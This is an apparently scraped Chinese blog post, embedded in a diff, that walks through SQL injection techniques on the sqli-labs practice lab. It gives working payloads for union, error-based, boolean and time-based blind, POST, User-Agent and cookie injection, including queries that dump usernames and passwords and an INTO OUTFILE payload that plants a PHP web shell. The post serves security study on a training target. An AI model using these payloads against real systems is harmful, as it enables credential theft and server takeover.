@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="sql," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="前言  最近花了一些时间把sql注入方面的基础知识结合sqlilabs的教程看完了，这里就做一个总结。 基础知识1.sql注入原理SQL注入漏洞的形成原因是：用户输入的数据或语句被sql解释器执行，而我们所要做的就是利用SQL注入绕过登录验证 2.sql注入分类分类见仁见智，就最基础的可大致这样来看 基于从服务器接收到的响应  基于错误的SQL注入 联合查询 sql盲注  基于注入点位置上的  p">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql学习（一）">
+<meta property="og:url" content="http://shEr0.github.io/2017/08/13/sql学习基础篇（一）/index.html">
+<meta property="og:site_name" content="shEr0&#39;s Blog">
+<meta property="og:description" content="前言  最近花了一些时间把sql注入方面的基础知识结合sqlilabs的教程看完了，这里就做一个总结。 基础知识1.sql注入原理SQL注入漏洞的形成原因是：用户输入的数据或语句被sql解释器执行，而我们所要做的就是利用SQL注入绕过登录验证 2.sql注入分类分类见仁见智，就最基础的可大致这样来看 基于从服务器接收到的响应  基于错误的SQL注入 联合查询 sql盲注  基于注入点位置上的  p">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://sher0.github.io/img/less1-1.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less1-2.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less-3.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less1-4.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less1-5.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less1-6.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/3.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/4.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/5.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/6.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/7.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/8.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less11-1.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less11-2.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less11-3.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less11-1.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less18-3.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less18-1.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less18-2.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less18-4.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less20-1.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less7-1.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less7-2.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less7-3.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less7-4.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less7-5.jpg">
+<meta property="og:image" content="http://sher0.github.io/img/less7-6.jpg">
+<meta property="og:updated_time" content="2017-08-13T12:14:40.388Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql学习（一）">
+<meta name="twitter:description" content="前言  最近花了一些时间把sql注入方面的基础知识结合sqlilabs的教程看完了，这里就做一个总结。 基础知识1.sql注入原理SQL注入漏洞的形成原因是：用户输入的数据或语句被sql解释器执行，而我们所要做的就是利用SQL注入绕过登录验证 2.sql注入分类分类见仁见智，就最基础的可大致这样来看 基于从服务器接收到的响应  基于错误的SQL注入 联合查询 sql盲注  基于注入点位置上的  p">
+<meta name="twitter:image" content="http://sher0.github.io/img/less1-1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://shEr0.github.io/2017/08/13/sql学习基础篇（一）/"/>
+
+
+
+
+
+  <title>sql学习（一） | shEr0's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">shEr0's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://shEr0.github.io/2017/08/13/sql学习基础篇（一）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="shEr0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="shEr0's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql学习（一）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-13T16:26:33+08:00">
+                2017-08-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/注入学习/" itemprop="url" rel="index">
+                    <span itemprop="name">注入学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  最近花了一些时间把sql注入方面的基础知识结合sqlilabs的教程看完了，这里就做一个总结。</p>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="1-sql注入原理"><a href="#1-sql注入原理" class="headerlink" title="1.sql注入原理"></a>1.sql注入原理</h4><p>SQL注入漏洞的形成原因是：用户输入的数据或语句被sql解释器执行，而我们所要做的就是利用SQL注入绕过登录验证</p>
+<h4 id="2-sql注入分类"><a href="#2-sql注入分类" class="headerlink" title="2.sql注入分类"></a>2.sql注入分类</h4><p>分类见仁见智，就最基础的可大致这样来看</p>
+<p><strong>基于从服务器接收到的响应</strong></p>
+<ul>
+<li>基于错误的SQL注入</li>
+<li>联合查询</li>
+<li>sql盲注</li>
+</ul>
+<p><strong>基于注入点位置上的</strong></p>
+<ul>
+<li>post型注入</li>
+<li>cookie注入</li>
+<li>http头注入</li>
+</ul>
+<h4 id="3-常用尝试语句"><a href="#3-常用尝试语句" class="headerlink" title="3.常用尝试语句"></a>3.常用尝试语句</h4><pre><code>or 1=1 --+
+&apos;or 1=1 --+  &quot;or 1=1 --+
+)or 1=1 --+
+&apos;)or 1=1 --+ &quot;)or 1=1 --+
+&quot;)or 1=1 --+
+</code></pre><h3 id="三、实战讲解（以sqli-labs为例）"><a href="#三、实战讲解（以sqli-labs为例）" class="headerlink" title="三、实战讲解（以sqli-labs为例）"></a>三、实战讲解（以sqli-labs为例）</h3><p><strong>1.基于报错的注入，与联合查询结合使用，例如less-1</strong></p>
+<p>首先测试</p>
+<pre><code>?id=1
+?id=1&apos;
+</code></pre><p><img src="/img/less1-1.jpg" alt="Alt text"></p>
+<p>我们可看到出现报错，sql语句有错误，我们可以分析出是单引号闭合问题。接着</p>
+<pre><code>?id=1&apos; or 1=1 --+
+</code></pre><p><img src="/img/less1-2.jpg" alt="Alt text"></p>
+<p>回显正确。<br>针对此类注入，因为没有任何绕过，我们即可进行最简单的注入操作。</p>
+<pre><code>?id1&apos; order by 3 --+
+</code></pre><p>猜解出有3列数据，接下来使用联合查询<br>（union查询即同时查询多个语句，我们通过使第一个语句错误，来执行写入的sql语句）</p>
+<p>爆数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/less-3.jpg" alt="Alt text"><br>我们可以看到爆出了数据库名称，这里选择security数据库</p>
+<p>爆数据表<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?<span class="attribute">id</span>=-1' union select 1,group_concat(table_name),3 <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>--+</div></pre></td></tr></table></figure></p>
+<p><img src="/img/less1-4.jpg" alt="Alt text"></p>
+<p>爆列名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/less1-5.jpg" alt="Alt text"></p>
+<p>爆数据<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?<span class="attribute">id</span>=-1' union select 1,username,password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=2 --+</div></pre></td></tr></table></figure></p>
+<p><img src="/img/less1-6.jpg" alt="Alt text"></p>
+<p>成功获得用户名和密码</p>
+<p><strong>2.sql盲注，例如less5</strong><br>①:利用报错注入，这种方式主要是利用count(*)聚合函数  把查询的部分以错误的形式显示出来</p>
+<p>基础知识</p>
+<hr>
+<ol>
+<li>order by 语句  用于根据制定的列队结果集进行排序</li>
+<li>count(*)  函数返回表中的记录数</li>
+<li>concat(*)  函数 拼接一个或多个字符串</li>
+<li>concat_ws(separator,str1,str2)  第一个参数为分隔符，分隔符放在字符串中间。<br>eg：select concat_ws(‘,’,’11’,’22’);   11,22</li>
+<li>group_concat()分组拼接函数</li>
+<li>group by 语句用于结合合计函数。</li>
+<li>数值处理</li>
+</ol>
+<ul>
+<li>floor() 函数用于取整</li>
+<li>rand()函数  在0和1之间产生一个随机数</li>
+</ul>
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1' union <span class="keyword">select</span>  <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'~'</span>,<span class="keyword">select</span> <span class="keyword">user</span>(),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></div></pre></td></tr></table></figure>
+<p>得到回显<br><img src="/img/3.jpg" alt="Alt text"><br>查数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a%<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/4.jpg" alt="Alt text"></p>
+<p>查表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a%<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/5.jpg" alt="Alt text"><br>改变limit1,1  limit2,1   可得到四个表，我们需要的是users表</p>
+<ol>
+<li>emails</li>
+<li>referers</li>
+<li>uagents</li>
+<li>users</li>
+</ol>
+<p>查列<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a%<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/6.jpg" alt="Alt text"><br>改变limit1,1  limit2,1   以此可得到username、password</p>
+<p>最后一步爆数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'2'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a%<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/7.jpg" alt="Alt text"><br>再查password<br><img src="/img/8.jpg" alt="Alt text"></p>
+<p>成功拿到用户名和密码</p>
+<p>②:利用布尔盲注，这种方式主要是通过构造逻辑判断来进行注入</p>
+<p>基础知识</p>
+<hr>
+<ol>
+<li>left(a,b)   函数从左侧截取a的前b位</li>
+<li>Ord() ascii() 函数将字符转化为ascii值</li>
+<li>mid(a,b,c)  substr(a,b,c)  函数从b位置开始，截取字符串a的c长度</li>
+<li>regexp ‘~[a-z]’  匹配正则表达式<br>用法一般为：select user() regexp ‘~[a-z]’<br>也可用like匹配</li>
+</ol>
+<p>开始对网页进行尝试：</p>
+<p>数据库 </p>
+<pre><code>?id=1 and left(database(),1)&gt;&apos;a&apos;--+
+</code></pre><p>查看数据库第一位是否&gt;a  由于我们的数据库为’security’,很明显是大于的，页面也返回正常</p>
+<pre><code>?id=1&apos; and left(database(),2)&gt;&apos;sa&apos;--+
+</code></pre><p>查看前两位是否大于sa    以此类推，利用二分法可得出数据库的名称。<br>补：也可以利用substr()和ascii()将得到的内容转换成ascii值来得出名称<br>比如查询security数据库下的第一个表的第一个字符<br>···<br>?id=1 and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;80<br>···</p>
+<p>此处仍然用二分法进行测试，直到回显正确。可以得到ascii值为101的时候正确，因为第一个表是email，e的ascii码为101  改变substr的数字，即可得到后面的字符</p>
+<p>查看列</p>
+<p> 可利用regexp 正则匹配来获取user表中的列<br>···<br>?id=1’ and 1=(select 1 from information_schema.columns where table_name=’users’ and table_name regexp ‘~us[a-z]’ limit 0,a)–+<br>···<br>即查询users表中是否存在为us**的列，页面回显正常2即为存在，以此种方法我们可以查出username和password</p>
+<p>以上几种方法通用，选择任何一种方法都能爆出数据，但此中方法花费时间较长，不推荐使用。</p>
+<p>此部分可参考Lcamry的mysql-injection</p>
+<p>③:利用延迟注入，延时注入主要是针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术<br>基础知识</p>
+<hr>
+<ol>
+<li>sleep()  延时</li>
+<li>if(condition,true,false)</li>
+</ol>
+<p>延时注入的原理就是，所要报的信息的ascii码正确时，产生延时，否则不延时。（反过来也可）</p>
+<pre><code>?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+
+</code></pre><p>意思是数据库名称第一个字符的ascii码是否为115，正确则返回页面，错误则产生5s的时间延迟。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。<br>也有benchmark()延时注入，与sleep用法相似。</p>
+<p>此种方法的应用在下面的其他类型注入中再来详细讲解。</p>
+<p><strong>3.POST型注入</strong></p>
+<p>post即是数据从客户端提交到服务器端</p>
+<p>当我们输入正确的用户名和密码，回显正确。<br><img src="/img/less11-1.jpg" alt="Alt text"><br>在post过程中，我们输入用户名和密码后台也能形成sql语句，我们就可以像get型一样构造post的payload。<br><img src="/img/less11-2.jpg" alt="Alt text"><br>我们可以输入万能用户名来测试<br>username:admin ‘#<br>password:123（随便输）<br><img src="/img/less11-3.jpg" alt="Alt text"><br>我们可以看到对单引号的处理，接着我们尝试输入<br>username:admin’ or ‘1’=’1#  密码随意  得到回显正确</p>
+<p>在此我们就可用union注入进行尝试：<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username:<span class="number">1</span>admin' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,database()<span class="meta">#</span></div><div class="line">password:随意</div></pre></td></tr></table></figure></p>
+<p><img src="/img/less11-1.jpg" alt="Alt text"><br>我们可以看到爆出了数据库security<br>接下来以此类推，构造sql语句进行注入</p>
+<p>在其他的post关卡中，有的不会显示你的登录信息，只会显示是否登录成功，此种情况就需要进行盲注。</p>
+<p><strong>4.http头注入和cookie注入</strong></p>
+<p>http：以less18为例<br>当我们输入数据库中的用户名和密码时，页面返回了useragent的信息<br><img src="/img/less18-3.jpg" alt="Alt text"><br>尝试对username进行注入，发现始终失败。通过查看源代码，发现<br><img src="/img/less18-1.jpg" alt="Alt text"><br>对uname和passwd进行了check_out()函数的处理，但我们在sql语句中看到了insert()<br><img src="/img/less18-2.jpg" alt="Alt text"><br>我们看到插入了useragent和ip，修改ip不方便，我们就可以通过修改useragent来进行注入。</p>
+<p>利用burpsuite进行抓包改包<br>把useragent修改为<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">'and extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>)) and '<span class="number">1</span>'='<span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p>得到回显</p>
+<p><img src="/img/less18-4.jpg" alt="Alt text"></p>
+<p>爆出了数据库security，以此类推改变sql语句，我们可以相继爆表名，爆列名，爆数据。</p>
+<p>cookie注入：以less20为例</p>
+<p>输入正确的用户名和密码，发现页面无任何反应，从题目可知这关涉及到cookie，因此我们仍然抓包改包</p>
+<p>我们将cookie内容改为：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin1'and extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>)) and '<span class="number">1</span>'='<span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p>GO一下得到页面<br><img src="/img/less20-1.jpg" alt="Alt text"></p>
+<p>爆出数据库名security，以此类推。</p>
+<p>补：这两种注入情况也有其他注入姿势，在这里值阐述最基本操作</p>
+<p><strong>导入导出文件注入</strong></p>
+<p>这种注入以less7为例</p>
+<p>参数测试，通过源代码可知</p>
+<p>所以<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?<span class="attribute">id</span>=1'))</div><div class="line">?<span class="attribute">id</span>=1')) <span class="keyword">or</span> <span class="attribute">1</span>=1 --+</div></pre></td></tr></table></figure></p>
+<p><img src="/img/less7-1.jpg" alt="Alt text"><br>回显正确，接下来进行文件导出<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=<span class="number">1</span>')) union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">"D:<span class="subst">\\</span>phpstudy<span class="subst">\\</span>WWW<span class="subst">\\</span>Less-7<span class="subst">\\</span>test.txt"</span> --+</div></pre></td></tr></table></figure></p>
+<p><img src="/img/less7-2.jpg" alt="Alt text"></p>
+<p>可看到虽然回显提示有错误，但我们的less7下已经创建了test.txt文件<br><img src="/img/less7-3.jpg" alt="Alt text"></p>
+<p>接下来我们插入一句话<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=<span class="number">1</span>'))union select <span class="number">1</span>,<span class="number">2</span>,'&lt;?php @eval($_post[<span class="string">"mima"</span>]) ?&gt;' into outfile <span class="string">"d:<span class="subst">\\</span>phpstudy<span class="subst">\\</span>WWW<span class="subst">\\</span>Less-7<span class="subst">\\</span>yijuhua.php"</span>--+</div></pre></td></tr></table></figure></p>
+<p><img src="/img/less7-4.jpg" alt="Alt text"></p>
+<p>可以看到写入成功，然后我们用菜刀连接<br><img src="/img/less7-5.jpg" alt="Alt text"><br><img src="/img/less7-6.jpg" alt="Alt text"></p>
+<p>连接成功后即可进入后台操作文件</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此，通过对sqlilabs第一部分的基础学习，掌握了SQL注入的一些基础姿势，绕过方式及其他注入操作或者奇怪姿势还需进一步学习。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql/" rel="tag"># sql</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/11/postName/" rel="next" title="随笔">
+                <i class="fa fa-chevron-left"></i> 随笔
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="shEr0" />
+          <p class="site-author-name" itemprop="name">shEr0</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基础知识"><span class="nav-number">2.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-sql注入原理"><span class="nav-number">2.1.</span> <span class="nav-text">1.sql注入原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-sql注入分类"><span class="nav-number">2.2.</span> <span class="nav-text">2.sql注入分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-常用尝试语句"><span class="nav-number">2.3.</span> <span class="nav-text">3.常用尝试语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、实战讲解（以sqli-labs为例）"><span class="nav-number">3.</span> <span class="nav-text">三、实战讲解（以sqli-labs为例）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 